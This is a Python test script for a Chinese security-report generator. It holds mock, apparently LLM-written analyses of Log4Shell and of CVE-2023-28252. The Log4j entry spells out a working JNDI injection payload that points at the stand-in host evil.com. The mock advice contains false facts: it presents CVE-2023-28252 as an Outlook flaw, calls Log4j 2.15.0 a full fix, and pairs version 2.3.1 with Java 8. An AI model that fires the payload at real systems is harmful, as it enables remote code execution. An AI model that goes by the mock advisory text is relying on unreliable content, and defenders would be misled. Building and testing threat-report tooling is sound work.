#!/usr/bin/env python3
"""测试 LLM 中文分析报告生成"""

from src.reporters.reporter import Reporter
import json

# 创建报告生成器
r = Reporter({'output_dir': 'reports', 'formats': ['markdown', 'json']})

# 模拟 LLM 分析后的完整数据（包含中文分析字段）
sample_items = [
    {
        'title': 'CVE-2021-44228 Apache Log4j 远程代码执行漏洞',
        'source': 'CNVD',
        'threat_level': 'CRITICAL',
        'confidence': 0.95,
        'urgency': '立即处置',
        'is_actionable': True,
        'summary': 'Apache Log4j是Apache软件基金会的一个Java日志库，存在远程代码执行漏洞。',
        'content': '该漏洞影响Log4j 2.0至2.14.1版本。',
        'url': 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
        'id': 'CVE-2021-44228',
        'raw': {
            'cvss_score': '9.8',
            'cvss_severity': 'CRITICAL',
            'cve_id': 'CVE-2021-44228',
            'vendor': 'Apache',
            'status': '已公开'
        },
        'affected_entities': ['Apache Log4j', 'Elasticsearch', 'Solr', 'Kafka'],
        'tags': ['rce', 'log4j', 'critical'],
        'reasoning': 'CVSS评分9.8，远程代码执行漏洞，影响广泛',
        
        # LLM 生成的中文分析字段
        'vuln_description_cn': """**漏洞原理**：Log4j 2.x 版本中存在JNDI注入漏洞。攻击者可以通过构造恶意日志消息，如 `${jndi:ldap://evil.com/malicious.class}`，触发Log4j的JNDI查找功能。当Log4j解析该字符串时，会连接到攻击者控制的LDAP服务器，并加载远程恶意类，从而在目标服务器上执行任意代码。

**利用方式**：攻击者只需向任何使用Log4j记录日志的输入点（如HTTP请求头、表单字段等）注入恶意JNDI字符串即可触发漏洞。由于许多Java应用都会记录请求日志，攻击面非常广泛。

**受影响版本**：Apache Log4j 2.0.0 至 2.14.1 版本。2.15.0及以上版本已修复该漏洞。

**攻击面**：所有使用Log4j进行日志记录的Java应用，包括但不限于：Web服务器、应用服务器、消息队列、大数据平台等。""",
        
        'potential_impact_cn': """**系统控制风险**：攻击者可完全控制受影响服务器，执行任意命令、安装后门、窃取数据。

**数据泄露风险**：攻击者可访问服务器上的敏感数据，包括配置文件、数据库凭证、用户数据等。

**横向移动**：可利用受影响服务器作为跳板，攻击内网其他系统。

**供应链影响**：由于Log4j被广泛集成在各种Java框架和应用中，漏洞影响范围极其广泛，包括众多知名企业和政府机构的系统。

**业务中断**：攻击者可破坏系统服务，导致业务完全中断。""",
        
        'recommended_actions_cn': """1. **立即升级**：将Log4j升级至2.15.0或更高版本。对于无法立即升级的环境，可升级至2.12.2（Java 7）或2.3.1（Java 8）并应用临时补丁。

2. **临时缓解**：设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，禁用JNDI查找功能。

3. **网络隔离**：限制受影响服务的网络访问权限，特别是限制对外LDAP/RMI连接。

4. **监控检测**：加强日志监控，检测异常的JNDI字符串模式和可疑网络连接。

5. **资产清查**：全面清查企业内部使用Log4j的系统和组件，确保所有实例都已修复。"""
    },
    {
        'title': 'CVE-2023-28252 Microsoft Outlook 权限提升漏洞',
        'source': 'CVE-NVD',
        'threat_level': 'HIGH',
        'confidence': 0.85,
        'urgency': '24小时内',
        'is_actionable': True,
        'summary': 'Microsoft Outlook存在权限提升漏洞，攻击者可提升权限。',
        'url': 'https://nvd.nist.gov/vuln/detail/CVE-2023-28252',
        'id': 'CVE-2023-28252',
        'raw': {
            'cvss_score': '7.8',
            'cvss_severity': 'HIGH',
            'cve_id': 'CVE-2023-28252',
            'vendor': 'Microsoft',
            'status': '已公开'
        },
        'affected_entities': ['Microsoft Outlook'],
        'tags': ['privilege-escalation', 'outlook'],
        'reasoning': 'CVSS评分7.8，权限提升漏洞',
        
        # LLM 生成的中文分析字段
        'vuln_description_cn': """**漏洞原理**：Microsoft Outlook在处理特定类型的消息时存在权限提升漏洞。当用户打开恶意邮件时，Outlook会以较高权限执行某些操作，允许攻击者绕过正常的安全限制。

**利用方式**：攻击者发送特制的恶意邮件，当用户预览或打开邮件时自动触发漏洞，无需用户交互即可提升权限。

**受影响版本**：Microsoft Outlook 2013、2016、2019及365版本。""",
        
        'potential_impact_cn': """**权限提升**：攻击者可获得比当前用户更高的系统权限。

**持久化访问**：可创建持久化后门，维持对系统的长期访问。

**数据访问**：可访问受限的系统文件和用户数据。""",
        
        'recommended_actions_cn': """1. **立即更新**：安装Microsoft发布的安全更新补丁。

2. **邮件过滤**：加强邮件安全网关规则，阻止可疑邮件。

3. **用户培训**：提醒用户谨慎处理不明来源的邮件。"""
    }
]

# 生成报告
result = r.generate(sample_items, {'used_llm': True, 'raw_count': 2})
print('报告生成成功:', result)
print(f"\n📄 报告位置: {result['markdown_path']}")